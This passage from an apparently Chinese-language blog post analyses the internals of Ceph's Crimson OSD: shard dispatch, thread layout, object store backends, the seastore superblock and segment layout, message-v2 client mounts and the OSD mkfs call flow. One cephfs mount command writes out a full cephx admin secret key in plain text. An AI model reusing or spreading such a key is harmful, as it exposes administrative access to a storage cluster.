c">seastar::listen<br>ss.listener-&gt;accept()<br>ss.listener-&gt;abort_accept()<br>ss.listener.reset()<br>local_store.mkfs()<br>local_store.mount()<br>local_store.umount()<br>local_store.mount_managers()<br>local_store.set_secondaries(...)<br>local_store.mkfs_managers()<br>local_device.do_shard_mount()<br>local_device.shard_mount()<br>local_device.shard_mkfs()<br>local_service.local_state.stop_pgs()<br>local_service.local_state.broadcast_map_to_pgs(local_service, epoch)<br>local_service.local_state.osdmap_gate.got_map(epoch)<br>local_service.local_state.set_up_epoch(e)<br>local_service.local_state.update_shard_superblock(superblock)<br>local.local_state.update_map(...)<br>local.local_state.stop_registry()<br>osd_state._set_active()<br>osd_state._set_stopping()<br></code></pre></td></tr></table></figure><p><strong><code>seastar::smp::submit_to</code> 的部分操作如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 在 shard 0 上处理 CEPH_MSG_OSD_MAP/MSG_COMMAND/MSG_OSD_MARK_ME_DOWN 消息</span><br>seastar::smp::submit_to(PRIMARY_CORE, ... )<br></code></pre></td></tr></table></figure><h2 id="4-2、线程示例"><a href="#4-2、线程示例" class="headerlink" title="4.2、线程示例"></a>4.2、线程示例</h2><p><strong>当 <code>crimson_seastar_num_threads</code> 设置为 <code>2</code> 的时候，crimson osd 的线程情况:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz.host build]# ps -T -p 270088<br>    PID    SPID TTY          TIME CMD<br> 270088  270088 pts/11   00:30:31 crimson-osd<br> 270088  270130 pts/11   00:22:41 reactor-1<br> 270088  270131 pts/11   00:00:00 syscall-0<br> 270088  270132 pts/11   00:00:00 syscall-1<br> 270088  270133 pts/11   00:00:00 crimson-osd<br> 270088  270134 pts/11   00:00:00 reactor-1<br></code></pre></td></tr></table></figure><p><strong>当 <code>crimson_seastar_num_threads</code> 设置为 <code>8</code> 的时候，crimson osd 的线程情况:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz.host build]# ps -T -p 345103<br>    PID    SPID TTY          TIME CMD<br> 345103  345103 pts/15   00:00:04 crimson-osd<br> 345103  345145 pts/15   00:00:02 reactor-1<br> 345103  345146 pts/15   00:00:02 reactor-2<br> 345103  345147 pts/15   00:00:02 reactor-3<br> 345103  345148 pts/15   00:00:02 reactor-4<br> 345103  345149 pts/15   00:00:02 reactor-5<br> 345103  345150 pts/15   00:00:02 reactor-6<br> 345103  345151 pts/15   00:00:02 reactor-7<br> 345103  345152 pts/15   00:00:00 syscall-7<br> 345103  345153 pts/15   00:00:00 syscall-0<br> 345103  345154 pts/15   00:00:00 syscall-4<br> 345103  345155 pts/15   00:00:00 syscall-3<br> 345103  345156 pts/15   00:00:00 syscall-2<br> 345103  345157 pts/15   00:00:00 syscall-5<br> 345103  345158 pts/15   00:00:00 syscall-1<br> 345103  345159 pts/15   00:00:00 syscall-6<br> 345103  345160 pts/15   00:00:00 crimson-osd<br> 345103  345161 pts/15   00:00:00 reactor-1<br> 345103  345162 pts/15   00:00:00 reactor-4<br> 345103  345163 pts/15   00:00:00 reactor-5<br> 345103  345164 pts/15   00:00:00 reactor-6<br> 345103  345165 pts/15   00:00:00 reactor-7<br> 345103  345166 pts/15   00:00:00 reactor-2<br> 345103  345167 pts/15   00:00:00 reactor-3<br></code></pre></td></tr></table></figure><h1 id="五、存储模块设计"><a href="#五、存储模块设计" class="headerlink" title="五、存储模块设计"></a>五、存储模块设计</h1><h2 id="5-1、后端对象存储类型"><a href="#5-1、后端对象存储类型" class="headerlink" title="5.1、后端对象存储类型"></a>5.1、后端对象存储类型</h2><p>main 函数中会通过 <code>crimson::os::FuturizedStore::create</code> 函数来创建 <code>store</code> 对象。根据 <code>osd_objectstore</code> 和 <code>osd_data</code> 参数来配置 <code>store</code> 对象。其中 <code>osd_objectstore</code> 参数指定了后端对象存储的类型，支持的参数有 <code>alienstore/cyanstore/seastore</code> ，默认为 <code>alienstore</code> （即后端存储为 <code>bluestore</code> ）。其中 <code>osd_data</code> 参数指定了数据存储目录（比如当使用 <code>vstart.sh</code> 部署集群时，对应的配置默认为 <code>./build/dev/osd$id</code> ）。</p><p><strong>对象存储类型:</strong></p><ul><li><strong><code>alienstore</code></strong>: 是 seastar 线程中的一个代理，主要是与 bluestore 进行通信。由于 io 任务会与 bluestore 进行通信，因此无需针对多个 osd 分片进行特殊处理。BlueStore 中没有针对 crimson 的定制，因为 bluestore 依赖于第三方 RocksDB 项目，而该项目仍然采用线程化设计，因此无法真正将其扩展为无共享设计。然而，在 crimson 能够提供经过优化且足够稳定的原生存储后端 seastore 之前，使用合理的开销来换取完善的存储后端解决方案是可以接受的。</li><li><strong><code>cyanstore</code></strong>: crimson osd 中的 cyanstore 与 classic osd 中的 memstore 相对应。为了支持多分片，唯一的变化是每个分片创建独立的 cyanstore 实例。一个目标是确保虚拟 IO 操作能够在同一核心中完成，以帮助识别 osd 级别的可扩展性问题（如果有）。另一个目标是在 osd 级别与 Classic 进行直接性能比较，而不会受到 objectstore 的复杂影响。</li><li><strong><code>seastore</code></strong>: seastore 是 crimson osd 的原生 objectstore 解决方案，它使用 seastar 框架开发并采用相同的设计原则。</li></ul><p>在 seastore 初始化的时候，会根据 <code>seastore_main_device_type</code> 参数来初始化 <code>seastore</code> 主设备，该参数可选值为 <code>SSD/RANDOM_BLOCK_SSD</code> （代码中还实现了 <code>HDD/ZBD</code> ，但是目前并不支持） ，默认为 <code>SSD</code> 。 在调用 <code>Device::make_device(root, d_type)</code> 函数创建 <code>device</code> 的过程中，会针对不同的设备类型又做了一些区分。</p><p><strong>seastore 设备类型对比:</strong></p><table><thead><tr><th align="center">device_type</th><th align="center">backend_type</th><th align="center">create func</th></tr></thead><tbody><tr><td align="center">HDD</td><td align="center">backend_type_t::SEGMENTED</td><td align="center">SegmentManager::get_segment_manager</td></tr><tr><td align="center">SSD</td><td align="center">backend_type_t::SEGMENTED</td><td align="center">SegmentManager::get_segment_manager</td></tr><tr><td align="center">ZBD</td><td align="center">backend_type_t::SEGMENTED</td><td align="center">SegmentManager::get_segment_manager</td></tr><tr><td align="center">RANDOM_BLOCK_SSD</td><td align="center">backend_type_t::RANDOM_BLOCK</td><td align="center">get_rb_device</td></tr></tbody></table><h2 id="5-2、段存储格式信息"><a href="#5-2、段存储格式信息" class="headerlink" title="5.2、段存储格式信息"></a>5.2、段存储格式信息</h2><p>当使用 <code>vstart.sh</code> 脚本部署测试集群后会发现 <code>build/dev/osd*/</code> 目录下会存在一个 <code>block</code> 文件，该文件对应的就是一个 <code>osd</code> 组件后端的对象存储，由于一个 <code>osd</code> 中可能会启用多个 <code>seastar shard</code> ，并且由于 <code>shard</code> 间数据的隔离，因此需要对这大块存储空间进行切割，使每个 <code>shard</code> 各负责一块空间，从而实现操作数据的隔离。 </p><p><strong>后端存储的格式化规则:</strong></p><ul><li>开始部分为 superblock 空间，存储这个该存储空间的规划及使用信息；</li><li>剩余空间平均分配给每个 shard ，实现独立的操作空间；</li></ul><p><strong>创建 superblock 及 shard 空间规划函数如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">using <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">block_sm_superblock_t</span> <span class="hljs-title function_">make_superblock</span><span class="hljs-params">(<span class="hljs-type">device_id_t</span> device_id, <span class="hljs-type">device_config_t</span> sm_config, <span class="hljs-type">const</span> seastar::stat_data&amp; data)</span><br>&#123;<br>    LOG_PREFIX(block_make_superblock);<br>    using crimson::common::get_conf;<br><br>    <span class="hljs-comment">// seastore_device_size 默认为 50G</span><br>    <span class="hljs-keyword">auto</span> config_size = get_conf&lt;Option::<span class="hljs-type">size_t</span>&gt;(<span class="hljs-string">&quot;seastore_device_size&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> size = (data.size == <span class="hljs-number">0</span>) ? config_size : data.size;<br><br>    <span class="hljs-comment">// 单个 segment 的大小，默认为 64M</span><br>    <span class="hljs-keyword">auto</span> config_segment_size = get_conf&lt;Option::<span class="hljs-type">size_t</span>&gt;(<span class="hljs-string">&quot;seastore_segment_size&quot;</span>);<br><br>    <span class="hljs-comment">// 计算 segment 数量： 总大小除以单个 segment 的大小</span><br>    <span class="hljs-type">size_t</span> raw_segments = size / config_segment_size;<br><br>    <span class="hljs-comment">// 计算每个 shard 所需要的段状态跟踪器大小</span><br>    <span class="hljs-comment">// 默认为一个 data.block_size 大小，如果计算出的每个 shard 所管理的 segments 数量超过 data.block_size 大小，</span><br>    <span class="hljs-comment">// 则返回超过 segments 数量的 data.block_size 的倍数值。</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// seastar::smp::count 为 crimson osd 启动时指定的 shard 数量</span><br>    <span class="hljs-comment">// data.block_size 默认为 4096</span><br>    <span class="hljs-type">size_t</span> shard_tracker_size = SegmentStateTracker::get_raw_size(raw_segments / seastar::smp::count, data.block_size);<br><br>    <span class="hljs-comment">// 计算全部 shard 的段状态跟踪器的总大小</span><br>    <span class="hljs-type">size_t</span> total_tracker_size = shard_tracker_size * seastar::smp::count;<br><br>    <span class="hljs-comment">// 初始的偏移应该从 superblock 之后开始</span><br>    <span class="hljs-type">size_t</span> tracker_off = data.block_size;<br><br>    <span class="hljs-comment">// 计算减去 superblock 及所有段状态跟踪器总大小之后的剩余空间可分配的 segments 数量</span><br>    <span class="hljs-type">size_t</span> segments = (size - tracker_off - total_tracker_size) / config_segment_size;<br><br>    <span class="hljs-comment">// 计算每个 shard 可分配的 segments 数量</span><br>    <span class="hljs-type">size_t</span> segments_per_shard = segments / seastar::smp::count;<br><br>    <span class="hljs-comment">// 初始化每个 shard 信息</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">block_shard_info_t</span>&gt; <span class="hljs-title function_">shard_infos</span><span class="hljs-params">(seastar::smp::count)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; seastar::smp::count; i++) &#123;<br>        <span class="hljs-comment">// 每个 shard 管理的 segments 总大小</span><br>        shard_infos[i].size = segments_per_shard * config_segment_size;<br>        <span class="hljs-comment">// 每个 shard 管理的 segments 数量</span><br>        shard_infos[i].segments = segments_per_shard;<br>        <span class="hljs-comment">// 标记每个 shard 的段状态跟踪器的在全部空间中的偏移</span><br>        shard_infos[i].tracker_offset = tracker_off + i * shard_tracker_size;<br>        <span class="hljs-comment">// 标记每个 shard 的 segment 数据起始位置在全部空间中的偏移</span><br>        shard_infos[i].first_segment_offset = tracker_off + total_tracker_size + i * segments_per_shard * config_segment_size;<br>    &#125;<br><br>    <span class="hljs-comment">// 输出日志信息</span><br>    INFO(<span class="hljs-string">&quot;&#123;&#125; disk_size=&#123;&#125;, segment_size=&#123;&#125;, block_size=&#123;&#125;&quot;</span>,<br>         <span class="hljs-type">device_id_printer_t</span>&#123;device_id&#125;,<br>         size,<br>         <span class="hljs-type">uint64_t</span>(config_segment_size),<br>         data.block_size);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; seastar::smp::count; i++) &#123;<br>        INFO(<span class="hljs-string">&quot;shard &#123;&#125; infos:&quot;</span>, i, shard_infos[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// 返回 superblock 全部信息</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-type">block_sm_superblock_t</span>&#123;seastar::smp::count, config_segment_size, data.block_size, shard_infos, <span class="hljs-built_in">std</span>::move(sm_config)&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="六、客户端使用方式"><a href="#六、客户端使用方式" class="headerlink" title="六、客户端使用方式"></a>六、客户端使用方式</h1><p>由于 crimson osd 只支持 <code>message v2</code> 协议，所以我们在挂载 cephfs&#x2F;cephrbd 等的时候需要使用 <code>message v2</code> 的方式。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载 cephrbd - kernel 方式</span><br>rbd device map -t krbd rbdpool/rbdimg01 -o mount_timeout=5,ms_mode=crc<br><br><span class="hljs-comment"># 挂载 cephrbd - nbd 方式</span><br>rbd device map -t nbd rbdpool/rbdimg01<br><br><span class="hljs-comment"># 取消挂载 cephrbd</span><br>rbd device unmap rbdpool/rbdimg01 -t krbd<br>rbd device unmap rbdpool/rbdimg01 -t nbd<br><br><span class="hljs-comment"># 挂载 cephfs - kernel 方式</span><br>mount -t ceph 10.10.10.1:3300:/ /mnt/kernel-cephfs -o name=admin,secret=AQBVokZoak+LJRAAqgeJr6j77v729bfvBl/Z3g==,ms_mode=crc,mount_timeout=5<br><br><span class="hljs-comment"># 挂载 cephfs - fuse 方式</span><br>ceph-fuse -c /etc/ceph/ceph.conf -n client.admin -m 10.10.10.1:3300 /mnt/fuse-cephfs --client_mountpoint /<br><br><span class="hljs-comment"># 取消挂载 cephfs</span><br>umount /mnt/kernel-cephfs<br>fusermount -u /mnt/fuse-cephfs<br></code></pre></td></tr></table></figure><p><strong>相关代码实现:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 筛选监听地址</span><br><span class="hljs-type">entity_addrvec_t</span> <span class="hljs-title function_">pick_addresses</span><span class="hljs-params">(<span class="hljs-type">int</span> what)</span><br>&#123;<br>    LOG_PREFIX(osd.cc : pick_addresses);<br>    <span class="hljs-type">entity_addrvec_t</span> addrs;<br>    crimson::common::CephContext cct;<br><br>    <span class="hljs-comment">// 仅筛选 message v2 的地址</span><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> flags = what | CEPH_PICK_ADDRESS_MSGR2;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> r = ::pick_addresses(&amp;cct, flags, &amp;addrs, <span class="hljs-number">-1</span>); r &lt; <span class="hljs-number">0</span>) &#123;<br>        throw <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;failed to pick address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> addr : addrs.v) &#123;<br>        INFO(<span class="hljs-string">&quot;picked address &#123;&#125;&quot;</span>, addr);<br>    &#125;<br>    <span class="hljs-keyword">return</span> addrs;<br>&#125;<br><br><span class="hljs-comment">// 接收请求</span><br>seastar::<span class="hljs-built_in">future</span>&lt;&gt; SocketMessenger::start(<span class="hljs-type">const</span> <span class="hljs-type">dispatchers_t</span>&amp; _dispatchers)<br>&#123;<br>    assert(seastar::this_shard_id() == sid);<br>    dispatchers.assign(_dispatchers);<br>    <span class="hljs-keyword">if</span> (listener) &#123;<br>        <span class="hljs-comment">// 仅支持 message v2 的地址</span><br>        ceph_assert(get_myaddr().is_msgr2());<br>        ceph_assert(get_myaddr().get_port() &gt; <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// 接收端口请求</span><br>        <span class="hljs-keyword">return</span> listener-&gt;accept([this](SocketRef _socket, <span class="hljs-type">entity_addr_t</span> peer_addr) &#123;<br>            assert(get_myaddr().is_msgr2());<br>            SocketFRef socket = seastar::make_foreign(<span class="hljs-built_in">std</span>::move(_socket));<br>            <span class="hljs-keyword">if</span> (listener-&gt;is_fixed_shard_dispatching()) &#123;<br>                <span class="hljs-keyword">return</span> accept(<span class="hljs-built_in">std</span>::move(socket), peer_addr);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> seastar::smp::submit_to(sid, [this, peer_addr, socket = <span class="hljs-built_in">std</span>::move(socket)]() mutable &#123;<br>                    <span class="hljs-keyword">return</span> accept(<span class="hljs-built_in">std</span>::move(socket), peer_addr);<br>                &#125;);<br>            &#125;<br>        &#125;);<br>    &#125;<br>    <span class="hljs-keyword">return</span> seastar::now();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="七、其他特性实现"><a href="#七、其他特性实现" class="headerlink" title="七、其他特性实现"></a>七、其他特性实现</h1><h2 id="7-1、冷热存储分离"><a href="#7-1、冷热存储分离" class="headerlink" title="7.1、冷热存储分离"></a>7.1、冷热存储分离</h2><p>当使用 <code>vstart.sh</code> 脚本部署测试的时候，我们会发现 <code>--seastore-secondary-devs</code> 和 <code>--seastore-secondary-devs-type</code> 配置，如果指定了这两个参数，该脚本便会通过 <code>dd</code> 格式化对应盘，然后创建 <code>./dev/osd$id/block.$type.1</code> 目录，之后执行 <code>ln -s $device ./dev/osd$id/block.$type.1/block</code> 创建一个软链文件。详细的代码可以查看: <a href="https://github.com/ceph/ceph/blob/v19.2.1/src/vstart.sh#L1194">https://github.com/ceph/ceph/blob/v19.2.1/src/vstart.sh#L1194</a> 。</p><p>按照官方解释这两个参数是用来指定次要块设备的列表和类型，进一步分析 <a href="https://docs.ceph.com/en/latest/dev/crimson/crimson/">crimson 官方文档</a> 我们发现这两个配置可用于实现 ceph 的冷热存储分离特性，即随着时间的推移逐步将较快设备（主设备）中的冷数据迁移到较慢的设备（次要设备）中，通常要求次要设备的速度不应该比主设备更快。我们能发现该特性与 <a href="https://docs.ceph.com/en/latest/rados/operations/cache-tiering/">Cache Tiering</a> 特性比较相似，之后也会做一下对比分析。</p><p><strong>关于主设备剔除数据到次要设备的相关参数:</strong></p><ul><li><code>seastore_multiple_tiers_stop_evict_ratio</code>: 当主设备的使用率低于此值时，停止将冷数据逐出到冷层。默认值为 0.5 。</li><li><code>seastore_multiple_tiers_default_evict_ratio</code>: 当主设备的使用率达到此值时，开始将冷数据迁移到次要设备。默认值为 0.6 。</li><li><code>seastore_multiple_tiers_fast_evict_ratio</code>: 当主设备的使用率达到此值时，开始执行快速逐出。默认值为 0.7 。</li></ul><h1 id="八、模块解析"><a href="#八、模块解析" class="headerlink" title="八、模块解析"></a>八、模块解析</h1><h1 id="九、代码逻辑梳理"><a href="#九、代码逻辑梳理" class="headerlink" title="九、代码逻辑梳理"></a>九、代码逻辑梳理</h1><p><code>main</code> 函数中启动的 <code>seastar::async</code> 异步任务的关键逻辑如下:</p><ul><li>设置日志级别并打开日志文件；</li><li>启动 <code>prometheus api server</code> ；</li><li>创建 <code>client/cluster/hb_front/hb_back</code> 消息管理器 <code>SocketMessenger</code> ；</li><li>创建 <code>store</code> 对象；</li><li>创建、初始化、启动 <code>crimson osd</code> 对象；</li></ul><h2 id="9-1、消息管理器创建逻辑"><a href="#9-1、消息管理器创建逻辑" class="headerlink" title="9.1、消息管理器创建逻辑"></a>9.1、消息管理器创建逻辑</h2><p>通过调用 <code>crimson::net::Messenger::create</code> 函数来依次创建 <code>client/cluster/hb_front/hb_back</code> 消息管理器，最终创建的对象类型为 <code>SocketMessenger</code> 。</p><p>其中创建 <code>client/cluster</code> 消息对象的时候 <code>dispatch_only_on_this_shard</code> 参数为 <code>false</code> ，意味着接收到的消息可能会交由其他的 <code>shard</code> 进行处理；创建 <code>hb_front/hb_back</code> 消息对象的时候 <code>dispatch_only_on_this_shard</code> 参数为 <code>true</code> ，意味着接收到的消息仅会由当前 <code>shard</code> 处理。</p><h2 id="9-2、store-对象创建逻辑"><a href="#9-2、store-对象创建逻辑" class="headerlink" title="9.2、store 对象创建逻辑"></a>9.2、store 对象创建逻辑</h2><p>通过调用 <code>crimson::os::FuturizedStore::create</code> 函数来创建 <code>store</code> 对象。根据 <code>osd_objectstore</code> 和 <code>osd_data</code> 参数来配置 <code>store</code> 对象。其中 <code>osd_objectstore</code> 参数指定了后端对象存储的类型，支持的参数有 <code>alienstore/cyanstore/seastore</code> ，默认为 <code>alienstore</code> （即后端存储为 <code>bluestore</code> ）。其中 <code>osd_data</code> 参数指定了数据存储目录（比如当使用 <code>vstart.sh</code> 部署集群时，对应的配置默认为 <code>./build/dev/osd$id</code> ）。</p><p><strong>crimson 支持以下三个 objectstore 后端:</strong></p><ul><li>alienstore: 提供与早期版本的对象存储（即 BlueStore）的兼容性。</li><li>cyanstore: 用于测试的模拟后端，由易失性内存实施。此对象存储在典型的 osd 中的 memstore 后建模。</li><li>seastore: 为 crimson osd 设计的新对象存储。对多个分片支持的路径因后端的特定目标而异。</li></ul><h2 id="9-3、crimson-osd-mkfs-逻辑"><a href="#9-3、crimson-osd-mkfs-逻辑" class="headerlink" title="9.3、crimson osd mkfs 逻辑"></a>9.3、crimson osd mkfs 逻辑</h2><p>由于在启动 <code>osd</code> 组件之前，我们需要初始化 <code>osd</code> 的文件系统环境，为此需要执行 <code>OSD::mkfs</code> 函数（相关操作顺序可以参考 <code>vstart.sh</code> 脚本中在启动 <code>osd</code> 组件的步骤，其中在启动 <code>osd</code> 之前需要先对其存储路径的环境执行 <code>mkfs</code> 操作。）</p><p><strong>OSD::mkfs 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span> store.start()<br>store.mkfs(osd_uuid) <span class="hljs-comment">// 重点</span><br><span class="hljs-number">2.</span> store.mount()<br><span class="hljs-number">3.</span> open_or_create_meta_coll(store)<br><span class="hljs-number">4.</span> _write_superblock(...)<br><span class="hljs-number">5.</span> store.write_meta(...)<br><span class="hljs-number">6.</span> store.umount()<br><span class="hljs-number">7.</span> store.stop()<br></code></pre></td></tr></table></figure><blockquote><p><strong>1. store.start()</strong></p></blockquote><p>由于 <code>store</code> 的类型存在三种： <code>alienstore/cyanstore/seastore</code> ， 所以对应的 start 逻辑也有三种。由于 <code>alienstore</code> 只是 <code>bluestore</code> 的代理，且实现比较简单，为此不做介绍；而 <code>cyanstore</code> 是作为一个内存存储模块而存在，仅作为开发测试使用，为此这里也不做介绍；所以以下仅介绍 <code>seastore</code> 的实现逻辑，对应的函数为 <code>SeaStore::start</code> 。</p><p><strong>SeaStore::start 函数中关联逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span> Device::make_device(root, d_type)<br><span class="hljs-number">2.</span> device-&gt;start()<br><span class="hljs-number">3.</span> shard_stores.start(root, device.get(), is_test)<br></code></pre></td></tr></table></figure><p><strong>1. Device::make_device(root, d_type) 逻辑解析:</strong><br>在 <code>seastore</code> 中有一个 <code>seastore_main_device_type</code> 参数，用于设置 <code>seastore</code> 主设备的类型，可选值为 <code>SSD/RANDOM_BLOCK_SSD</code> （代码中还实现了 <code>HDD/ZBD</code> ，但是目前并不支持） ，默认为 <code>SSD</code> 。 </p><p><code>Device::make_device(root, d_type)</code> 函数内部在创建 <code>device</code> 的过程中，会针对不同的设备类型又做了一些区分，详细的类别分类如下:</p><table><thead><tr><th align="center">device_type</th><th align="center">backend_type</th><th align="center">create func</th></tr></thead><tbody><tr><td align="center">HDD</td><td align="center">backend_type_t::SEGMENTED</td><td align="center">SegmentManager::get_segment_manager</td></tr><tr><td align="center">SSD</td><td align="center">backend_type_t::SEGMENTED</td><td align="center">SegmentManager::get_segment_manager</td></tr><tr><td align="center">ZBD</td><td align="center">backend_type_t::SEGMENTED</td><td align="center">SegmentManager::get_segment_manager</td></tr><tr><td align="center">RANDOM_BLOCK_SSD</td><td align="center">backend_type_t::RANDOM_BLOCK</td><td align="center">get_rb_device</td></tr></tbody></table><p>由于 <code>seastore_main_device_type</code> 默认为 <code>SSD</code> ，所以会通过 <code>SegmentManager::get_segment_manager</code> 函数来来创建一个 <code>segment_manager::block::BlockSegmentManager</code> 对象。</p><p><strong>2. device-&gt;start() 逻辑解析:</strong><br>当执行 <code>device-&gt;start()</code> 的时候，调用的就是 <code>BlockSegmentManager::start</code> 方法，继而调用的是 <code>shard_devices.start(device_path, superblock.config.spec.dtype)</code> ，由于 <code>shard_devices</code> 的类型为 <code>seastar::sharded&lt;NVMeBlockDevice&gt;</code> , 所以这里相当于调用了 <code>seastar::sharded::start</code> 函数来初始化了 <code>BlockSegmentManager</code> 对象。</p><p><strong>3. shard_stores.start(root, device.get(), is_test) 逻辑解析:</strong><br>之后的 <code>shard_stores.start(root, device.get(), is_test)</code> 函数执行中，由于 <code>shard_stores</code> 也是一个 <code>seastar::sharded</code> 封装的对象，所以其内部相当于调用了 <code>seastar::sharded::start</code> 函数来初始化了 <code>SeaStore::Shard</code> 对象。</p><blockquote><p><strong>2. store.mount()</strong></p></blockquote><p><code>store.mount()</code> 函数对应的是 <code>SeaStore::mount</code> 函数。</p><p><strong>SeaStore::mount 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">device-&gt;mount()<br>device-&gt;get_sharded_device().get_secondary_devices()<br>Device::make_device(path, dtype)<br>sec_dev-&gt;start()<br>sec_dev-&gt;mount()<br>set_secondaries()<br></code></pre></td></tr></table></figure><p><code>device-&gt;mount()</code> 函数对应的是 BlockSegmentManager::mount 函数，这个之前解释过，其内部通过调用 <code>shard_devices.invoke_on_all</code> 来触发在每个 <code>shard</code> 中执行 <code>local_device.shard_mount()</code> 函数，因此每个 shard 中调用的函数其实是 <code>BlockSegmentManager::shard_mount()</code> ，该函数内部的执行逻辑主要包括打开 <code>device</code> ，读取 <code>superblock</code> 信息，校验 <code>superblock</code> 信息，更新 <code>tracker</code> 信息等。</p><blockquote><p><strong>3. open_or_create_meta_coll(store)</strong></p></blockquote><p><code>open_or_create_meta_coll(store)</code> 对应的函数是 <code>OSD::open_or_create_meta_coll</code> 。</p><p><strong>OSD::open_or_create_meta_coll 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">store.get_sharded_store().open_collection(<span class="hljs-type">coll_t</span>::meta())<br>store.get_sharded_store().create_new_collection(<span class="hljs-type">coll_t</span>::meta())<br>OSDMeta(ch, store.get_sharded_store())<br></code></pre></td></tr></table></figure><blockquote><p><strong>4. _write_superblock(…)</strong></p></blockquote><p><code>_write_superblock(...)</code> 的完整调用为 <code>_write_superblock(store, std::move(meta_coll), std::move(superblock))</code> ，其对应的函数是 <code>OSD::_write_superblock</code> 。其内部主要的逻辑为将 <code>superblock</code> 信息写入存储中。</p><p><strong>OSD::_write_superblock 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">meta_coll.load_superblock()<br>meta_coll.create(t)<br>meta_coll.store_superblock(t, superblock)<br>store.get_sharded_store().do_transaction(meta_coll.collection(), <span class="hljs-built_in">std</span>::move(t))<br></code></pre></td></tr></table></figure><blockquote><p><strong>5. store.write_meta(…)</strong></p></blockquote><p>store.write_meta(…) 对应很多写元信息的操作，操作的元信息包括 <code>ceph_fsid</code> ，<code>magic</code> ，<code>whoami</code> ，<code>osd_key</code> ， <code>osdspec_affinity</code> ， <code>ready</code> 等字段。这些信息位于 <code>osd</code> 运行目录的各个配置对应的文件中。</p><blockquote><p><strong>6. store.umount()</strong></p></blockquote><p><code>store.umount()</code> 对应的函数为 <code>SeaStore::umount</code> ， 其内部会同通过调用 <code>shard_stores.invoke_on_all</code> 函数，让每个 <code>shard</code> 执行 <code>local_store.umount()</code> 函数。</p><blockquote><p><strong>7. store.stop()</strong></p></blockquote><p><code>store.stop()</code> 对应的函数为 <code>SeaStore::stop</code> 。</p><p><strong>SeaStore::stop 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">sec_dev-&gt;stop()<br>secondaries.clear()<br>device-&gt;stop()<br>shard_stores.stop()<br></code></pre></td></tr></table></figure><h3 id="9-3-1、store-mkfs-osd-uuid"><a href="#9-3-1、store-mkfs-osd-uuid" class="headerlink" title="9.3.1、store.mkfs(osd_uuid)"></a>9.3.1、store.mkfs(osd_uuid)</h3><p><strong>SeaStore::mkfs 函数中关键逻辑为:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span> read_meta(<span class="hljs-string">&quot;mkfs_done&quot;</span>)<br><span class="hljs-number">2.</span> seastar::open_directory(root)<br>        root_f-&gt;list_directory(...)<br>            Device::make_device(path, dtype)<br>            secondaries.emplace_back(<span class="hljs-built_in">std</span>::move(sec_dev))<br>            p_sec_dev-&gt;start()<br>            p_sec_dev-&gt;mkfs()<br>            set_secondaries()<br><span class="hljs-number">3.</span> device-&gt;mkfs(...)<br><span class="hljs-number">4.</span> device-&gt;mount()<br><span class="hljs-number">5.</span> local_store.mkfs_managers() <span class="hljs-comment">// shard_stores.invoke_on_all(...) // 重点</span><br><span class="hljs-number">6.</span> prepare_meta(new_osd_fsid)<br><span class="hljs-number">7.</span> umount()<br></code></pre></td></tr></table></figure><blockquote><ol><li>read_meta(“mkfs_done”)</li></ol></blockquote><p><code>read_meta(&quot;mkfs_done&quot;)</code> 用于校验之前是否已经执行过 <code>mkfs</code> 操作，监测方式为读取 <code>store</code> 目录中的 <code>mkfs_done</code> 文件中的内容。</p><blockquote><ol start="2"><li>seastar::open_directory(root)</li></ol></blockquote><p><code>seastar::open_directory(root)</code> 的逻辑为检索 <code>store</code> 目录中的文件，筛选前缀名为 <code>block.</code> 的文件&#x2F;目录，通过解析该文件&#x2F;目录的后缀，从而尝试调用 <code>Device::make_device(path, dtype)</code> 函数来创建对应的 <code>device</code> ， 进而操作对应的 <code>device</code> 执行 <code>start</code> 和 <code>mkfs</code> 函数操作。</p><blockquote><ol start="3"><li>device-&gt;mkfs(…)</li></ol></blockquote><p><code>device-&gt;mkfs(...)</code> 对应的完整函数为 <code>device-&gt;mkfs(device_config_t::create_primary(new_osd_fsid, id, d_type, sds))</code> ， 由于 <code>seastore_main_device_type</code> 默认为 <code>SSD</code> ，所以这里的 <code>device-&gt;mkfs</code> 指的是 <code>BlockSegmentManager::mkfs</code> 函数。</p><p><code>BlockSegmentManager::mkfs</code> 